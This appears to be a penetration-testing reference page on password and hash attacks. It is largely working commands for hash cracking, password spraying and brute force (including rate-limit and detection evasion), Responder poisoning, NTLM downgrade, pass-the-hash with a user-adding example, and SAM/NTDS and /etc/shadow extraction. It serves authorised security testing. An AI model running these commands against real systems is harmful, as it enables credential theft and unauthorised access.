# Password & Hash Attacks

Two jobs: get credentials from the network (online spraying/brute force, hash capture) and crack the hashes you collect (offline). Then reuse everything — password reuse is consistently the highest-ROI move on any assessment, often beating exploit-hunting outright.

{% hint style="warning" %}
Respect the lockout policy before spraying. Enumerate the lockout threshold and reset window first, spray **one** password per window, and wait out the observation period before the next. A lockout storm during a real engagement is a bad look and can trigger incident response.
{% endhint %}

## Hash Identification & Format Reference

```bash
hashid -m '<hash>'
```

| Hash Type | Format / Prefix | Hashcat Mode | John Format |
| --- | --- | --- | --- |
| MD5 (unsalted) | 32 hex chars | `0` | `raw-md5` |
| SHA1 | 40 hex chars | `100` | `raw-sha1` |
| SHA256 | 64 hex chars | `1400` | `raw-sha256` |
| NTLM | `aad3b435b51404ee:<hash>` | `1000` | `NT` |
| NetNTLMv1 | `USER::DOMAIN:...` | `5500` | `netntlm` |
| NetNTLMv2 | `USER::DOMAIN:nonce:response` | `5600` | `netntlmv2` |
| Kerberos AS-REP | `$krb5asrep$23$...` | `18200` | `krb5asrep` |
| Kerberos TGS (RC4) | `$krb5tgs$23$*...` | `13100` | `krb5tgs` |
| Kerberos TGS (AES128) | `$krb5tgs$17$...` | `19600` | — |
| Kerberos TGS (AES256) | `$krb5tgs$18$...` | `19700` | — |
| DCC2 (cached domain creds) | `$DCC2$10240#user#hash` | `2100` | `mscash2` |
| bcrypt | `$2y$` / `$2a$` / `$2b$` | `3200` | `bcrypt` |
| md5crypt | `$1$` | `500` | `md5crypt` |
| sha512crypt | `$6$` | `1800` | `sha512crypt` |
| APR1 (Apache htpasswd) | `$apr1$` | `1600` | `md5crypt-apr` |
| phpass (WordPress) | `$P$` | `400` | `phpass` |
| Atlassian PKCS5S2 | `{PKCS5S2}` | `12001` | — |
| SSHA256 (GlassFish) | — | `1411` | — |
| WPA2 | `.hccapx` | `22000` | — |
| BitLocker | recovery blob | `22100` | — |
| Office 2013+ | office2john output | `9600` | — |
| Office 2010 | office2john output | `9500` | — |

### Protected-File Conversion Toolkit

| Command | Input | Hashcat mode |
| --- | --- | --- |
| `ssh2john` | Encrypted SSH private key | 22921 (`$sshng$6$`) |
| `zip2john` | Encrypted `.zip` | 13600 (PKZIP), 17225-17230 (AES-ZIP) |
| `rar2john` | Encrypted `.rar` | 13000 |
| `7z2john` | Encrypted `.7z` | 11600 |
| `office2john` | Office 2013+ `.docx/.xlsx/.pptx` | 9600 |
| `pdf2john` | Password-protected `.pdf` | 10500 / 10700 |
| `keepass2john` | `.kdbx` (KeePass 2) | 13400 |
| `gpg2john` | GnuPG secret key | 17010 |
| `ansible2john` | Ansible Vault file | — (John only) |
| `bitlocker2john -i <blob>` | BitLocker recovery blob | 22100 |
| `ecryptfs2john` | Linux eCryptfs passphrase | 12200 |
| `unshadow` | `/etc/passwd` + `/etc/shadow` | 1800 (sha512crypt) |

## Hashcat

```bash
hashcat -a <attack> -m <mode> <hashfile> [wordlist/mask]
# -a 0  dictionary   -a 3  mask (brute force)   -a 6  hybrid dict+mask
```

### Dictionary Attack

```bash
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Mask Attack (Targeted Brute Force)

```bash
# Uppercase*1 + Lowercase*5 + Digit*2
hashcat -m 1000 --status --status-timer 300 -w 4 -O hash.txt -a 3 ?u?l?l?l?l?l?d?d

# All printable chars (increment 4-8)
hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type 1000 hash.txt "?a?a?a?a?a?a?a?a?a?a?a?a"
```

| Token | Meaning |
| --- | --- |
| `?l` | Lowercase (a-z) |
| `?u` | Uppercase (A-Z) |
| `?d` | Digit (0-9) |
| `?s` | Special chars |
| `?a` | All printable |
| `?b` | Bytes (0x00-0xff) |

```bash
# Custom charset
hashcat --custom-charset1 "?u" --custom-charset2 "?l?u?d" --custom-charset3 "?d" -a 3 -m 1000 hash.txt "?1?2?2?2?3"
```

### Hybrid Attack (Dict + Mask)

```bash
hashcat -a 6 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt '?d?d'
```

### Rules

```bash
/usr/share/hashcat/rules/best64.rule
/usr/share/hashcat/rules/dive.rule
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Preview a rule's output before a slow crack — `--stdout` prints mutations without touching a hash file:

```bash
cat demo.rule
# $1
hashcat -r demo.rule --stdout demo.txt
# password1
# iloveyou1
```

Rule reference: `$X` append, `^X` prepend, `c` capitalize, `l`/`u` lower/upper, `T0` toggle-case at position 0, `d` duplicate, `r` reverse, `sab` replace all `a` with `b`.

### Show Cracked Passwords

```bash
hashcat --show -m 1000 hash.txt
```

## John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john hash.txt                                       # auto-detect format
john --format=NT hash.txt --wordlist=rockyou.txt
john --show hash.txt
john --restore
john --wordlist=<wordlist> passwd --rules=Jumbo
```

### Protected File Cracking

```bash
ssh2john id_rsa > ssh_hash.txt        && john --wordlist=rockyou.txt ssh_hash.txt
zip2john protected.zip > zip_hash.txt && john --wordlist=rockyou.txt zip_hash.txt
keepass2john Database.kdbx > kp.txt   && john --wordlist=rockyou.txt kp.txt
rar2john file.rar > rar_hash.txt      && john --wordlist=rockyou.txt rar_hash.txt
office2john document.docx > off.txt   && john --wordlist=rockyou.txt off.txt
pdf2john file.pdf > pdf_hash.txt      && john --wordlist=rockyou.txt pdf_hash.txt
gpg2john pgp-key.txt > gpg_hash.txt   && john --wordlist=rockyou.txt gpg_hash.txt
ansible2john vault.yml > av_hash.txt  && john --wordlist=rockyou.txt av_hash.txt
bitlocker2john -i image.raw > bl.hash && hashcat -m 22100 bl.hash /usr/share/wordlists/rockyou.txt
```

### Linux Shadow Cracking

```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
john unshadowed.txt --wordlist=rockyou.txt
```

### SSH Key Passphrase — John Rule Fallback

When hashcat rejects `sshng` hashes ("Token length exception"), fall back to a custom John rule stanza:

```bash
cat ssh.rule
# [List.Rules:sshRules]
# c $1 $3 $7 $!
sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

## Password Spraying

### Safe Spraying Formula

```
Max attempts = Lockout Threshold - 2
Wait time    = Reset Counter + 5 min buffer
If threshold unknown -> try ONLY 1 password, wait 1+ hour
```

{% hint style="info" %}
The builtin Administrator account (RID 500) cannot be locked out regardless of failed attempts — safe to test more aggressively against it specifically.
{% endhint %}

### Best Passwords to Spray

`P@ssw0rd01`, `Password123`, `Password1`, `Welcome1`, `Welcome01`, `Hello123`, `<Company>1`, `<Season><Year>!` (e.g. `Winter2025!`), and anything harvested from OSINT. Empty password → NT hash `31d6cfe0d16ae931b73c59d7e0c089c0`.

```bash
# Kerbrute — stealthier, no Event ID 4625 (uses 4771 instead)
kerbrute passwordspray -d <DOMAIN> --dc <TARGET> valid_users.txt Welcome1

# NetExec / CrackMapExec
nxc smb <TARGET> -u /path/to/users.txt -p '<PASSWORD>'
nxc ldap targets.txt -u <USER> -p '<PASSWORD>' -d <DOMAIN>
nxc winrm targets.txt -u <USER> -p '<PASSWORD>' -d <DOMAIN>

# Local admin spray
nxc smb --local-auth <SUBNET> -u administrator -H <NT_HASH>

# rpcclient one-liner (legacy)
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <TARGET> | grep Authority; done
```

```powershell
# DomainPasswordSpray (Windows)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Domain <DOMAIN> -PasswordList passlist.txt -OutFile sprayed-creds.txt

# SMBAutoBrute (self-throttling on lockout threshold)
Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1" -LockoutThreshold 5
```

```bash
# O365 / cloud
python3 o365spray.py --validate --domain <TARGET_DOMAIN>
python3 o365spray.py --enum -U users.txt --domain <TARGET_DOMAIN>
python3 o365spray.py --spray -U valid_users.txt -p '<PASSWORD>' --count 1 --lockout 1 --domain <TARGET_DOMAIN>
```

```bash
# IMAP spray (PAM-backed mail servers reuse creds across users heavily)
hydra -L <USERLIST> -p '<PASSWORD>' <TARGET> imap -V
nxc imap <TARGET> -u <USERLIST> -p '<PASSWORD>'
curl -k "imaps://<TARGET>/INBOX" --user "<USER>:<PASSWORD>"
```

### Monitoring Spray Attempts

```bash
netexec ldap <DC_IP> -u 'username' -p 'password' --users
# badpwdcount: 0 = unknown or no failed attempts yet
```

## Kerberos Pre-Auth Bruteforcing

```bash
./kerbrute_linux_amd64 userenum -d domain.local --dc <TARGET> usernames.txt
./kerbrute_linux_amd64 bruteuser -d domain.local --dc <TARGET> rockyou.txt username
```

Kerberos pre-auth errors log as Event ID **4771**, not 4625 — this makes kerbrute significantly stealthier than a normal authentication brute force.

```bash
# AS-REP roast probe with no creds at all
impacket-GetNPUsers <DOMAIN>/<USER> -dc-ip <DC_IP> -no-pass -format hashcat
```

## Network Service Brute Forcing

### Hydra

```bash
hydra -l root -P passwords.txt ssh://<TARGET>
hydra -L users.txt -P passwords.txt ftp://<TARGET>
hydra -l administrator -P passwords.txt rdp://<TARGET>
hydra -l admin -P passwords.txt smb://<TARGET>
hydra -l admin -P passwords.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

Cookie-embedded variant for session-based apps:

```bash
hydra -l user -P rockyou.txt <TARGET> \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:H=Cookie\: PHPSESSID=abcd1234:F=invalid"
```

**Rate-limit bypass** (fail2ban on SSH/RDP):

```bash
hydra -l george -P rockyou.txt -t 4 -W 3 ssh://<TARGET>
# -t 4 = 4 parallel tasks, -W 3 = wait 3s between each child task
```

**Iterate users per password** (friendlier to per-user lockout policies than the default per-user-then-password order):

```bash
hydra -f -L users.txt -u -P passwords.txt <TARGET> ftp
```

| Flag | Purpose |
| --- | --- |
| `-l` / `-L` | Single username / username file |
| `-p` / `-P` | Single password / password file |
| `-C` | Credential file (user:pass pairs) |
| `-t` | Parallel threads (default 16) |
| `-f` | Stop on first success |
| `-x` | Generate passwords (`MIN:MAX:CHARSET`) |
| `-u` | Iterate users per password |

### Medusa

```bash
medusa -u <USER> -P /usr/share/wordlists/rockyou.txt -h <TARGET> -M ssh
medusa -U users.txt -P passwords.txt -H targets.txt -M ssh
```

| Flag | Purpose |
| --- | --- |
| `-M` | Protocol module (ftp, ssh, smbnt, http, mysql, rdp) |
| `-m` | Module-specific params (e.g. `-m DIR:/admin`) |
| `-f` | Stop after first valid pair |

## Password Mutations & Custom Wordlists

```bash
cewl https://<TARGET> -d 4 -m 6 --lowercase -w wordlist.txt
cupp -i
./username-anarchy -i names.txt > usernames.txt
```

## Hash Capture

### Responder / Inveigh (LLMNR/NBT-NS Poisoning)

```bash
sudo responder -I eth0             # active poisoning
sudo responder -I eth0 -A          # passive analysis only
sudo responder -I eth0 -wf         # WPAD proxy + OS fingerprinting
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### LmCompatibilityLevel

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
```

| Level | Description |
| --- | --- |
| 0 | Send LM & NTLM |
| 1 | NTLMv2 session security if negotiated |
| 2 | NTLM response only |
| 3 | NTLMv2 response only |
| 4 | DCs refuse LM |
| 5 | DCs refuse LM & NTLM (NTLMv2 only) |

### NetNTLMv1 Downgrade + Shucking

Requires `LmCompatibilityLevel = 0x1` and a custom Responder challenge:

```bash
sudo responder -I eth0 --lm
python3 PetitPotam.py -u Username -p Password -d Domain -dc-ip <DC_IP> <RESPONDER_IP> <DC_IP>
```

```bash
# Shuck a captured NetNTLMv1 to an NT hash for pass-the-hash
php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin
```

## Pass-the-Hash (PtH)

```powershell
# Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<NT_HASH>

# Invoke-TheHash
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NT_HASH> -Command "net user pwn Passw0rd123! /add"
```

```bash
impacket-psexec administrator@<TARGET> -hashes :<NT_HASH>
impacket-wmiexec administrator@<TARGET> -hashes :<NT_HASH>
impacket-smbexec administrator@<TARGET> -hashes :<NT_HASH>
impacket-atexec -hashes :<NT_HASH> administrator@<TARGET> "whoami"
netexec smb <SUBNET> -u Administrator -d . -H <NT_HASH>
evil-winrm -i <TARGET> -u Administrator -H <NT_HASH>
xfreerdp /v:<TARGET> /u:<USER> /pth:<NT_HASH>          # requires Restricted Admin Mode
```

### Impacket Exec-Method Choice

| Tool | Transport | Shell type | Notes |
| --- | --- | --- | --- |
| `psexec` | SMB (445) | SYSTEM interactive | Loud — drops a service binary, Event 7045 |
| `wmiexec` | DCOM (135) + SMB output pipe | User-context semi-interactive | Quieter — no dropped binary |
| `smbexec` | SMB (445) | SYSTEM semi-interactive | No dropped binary, randomised service name |
| `atexec` | Task Scheduler (135) | SYSTEM, blind, one command | Task appears/disappears fast, Event 4698 |

All four accept `-hashes LM:NT` (32 zeros for LM if unknown) and `-k -no-pass` for Kerberos pass-the-ticket.

### Enable Restricted Admin for RDP PtH

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### UAC Remote Restrictions

| Registry Key | Value | Effect |
| --- | --- | --- |
| `LocalAccountTokenFilterPolicy` | 0 | Only RID-500 can remote PtH |
| `LocalAccountTokenFilterPolicy` | 1 | All local admins can remote PtH |
| `FilterAdministratorToken` | 1 | RID-500 enrolled in UAC (blocks PtH) |

## OverPass-the-Hash & Pass-the-Key

```bash
python3 ./getTGT.py -hashes ":<NT_HASH>" <DOMAIN>
export KRB5CCNAME="/root/velociraptor.ccache"
python3 psexec.py "<DOMAIN>/<USER>@<TARGET>" -k -no-pass
```

```powershell
.\Rubeus.exe asktgt /user:Administrator /rc4:<NT_HASH> /ptt
.\Rubeus.exe asktgt /user:Administrator /aes256:<AES_KEY> /opsec /ptt
```

| Type | Algorithm | Note |
| --- | --- | --- |
| RC4 | ARCFOUR-HMAC-MD5 (23) | Equivalent to the NTLM hash |
| DES | DES3-CBC-SHA1 (16) | Deprecated |
| AES128 | AES128-CTS-HMAC-SHA1-96 (17) | Modern |
| AES256 | AES256-CTS-HMAC-SHA1-96 (18) | Modern, strongest |

## NTDS.dit / SAM Extraction & Cracking

```powershell
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
secretsdump.py <DOMAIN>/admin@<DC_IP> -just-dc-ntlm
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

### bcrypt / DCC2 — Slow-Hash Handling

```bash
# bcrypt — intentionally slow; use targeted wordlists over massive ones
hashcat -m 3200 bcrypt_hashes.txt custom_passwords.txt --workload-profile=3

# DCC2 — $DCC2$10240#user#hash, 10240 iterations — very rarely worth cracking
hashcat -m 2100 dcc2_hashes.txt rockyou.txt --workload-profile=1
```

{% hint style="info" %}
If DCC2 doesn't crack quickly against rockyou, don't chase it further — look for cleartext credentials in LSA secrets, config files, or BloodHound-derived delegation/ACL paths instead.
{% endhint %}

## Hash Type Decision Tree

```
Hash Found -> Identify Type -> Decision

NetNTLMv2 (Responder/LLMNR)
├─ hashcat -m 5600 -> crack to cleartext
├─ POST-CRACK: spray across all hosts
└─ Cannot be used for pass-the-hash directly

NTLM (NT hash, from SAM/NTDS dump)
├─ Try pass-the-hash immediately (evil-winrm -H, nxc -H, impacket -hashes)
├─ If PtH fails: hashcat -m 1000
└─ POST-CRACK: spray the cleartext everywhere

Kerberos TGS (Kerberoasting)
├─ hashcat -m 13100 (RC4) or -m 19700 (AES256)
└─ POST-CRACK: WinRM, SMB, spray

bcrypt (web apps)
├─ hashcat -m 3200 (SLOW — targeted wordlist)
└─ If not cracked quickly, move to other vectors

DCC2 (cached domain creds)
├─ hashcat -m 2100 (EXTREMELY SLOW)
└─ Don't crack unless no other path exists

Cleartext (LSA secrets, config files, LDAP descriptions)
└─ Use immediately, spray everywhere — credential reuse is the norm
```

## Credential Spray Protocol

Every time you find any new credential:

```bash
nxc smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
nxc winrm <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>

# Password reuse across usernames
for user in admin administrator root system service; do
  nxc smb <SUBNET>/24 -u "$user" -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
done
```

## Detection Awareness — Key Event IDs

| Event ID | Description |
| --- | --- |
| 4625 | Failed logon (SMB/NTLM) — brute force indicator |
| 4768 | TGT requested |
| 4769 | TGS requested — Kerberoasting indicator |
| 4771 | Kerberos pre-auth failed — kerbrute attempts |
| 4697 / 7045 | Service installed |

## Related

- [Windows Privilege Escalation](windows-privesc-methodology.md)
- [Linux Privilege Escalation](linux-privesc-methodology.md)
- [Credential Dumping](credential-dumping.md)
- [Lateral Movement](lateral-movement.md)
- [Active Directory Attacks](ad-attacks.md)
- [Shells & Payloads](shells-payloads.md)
- [Report Writing](report-writing.md)
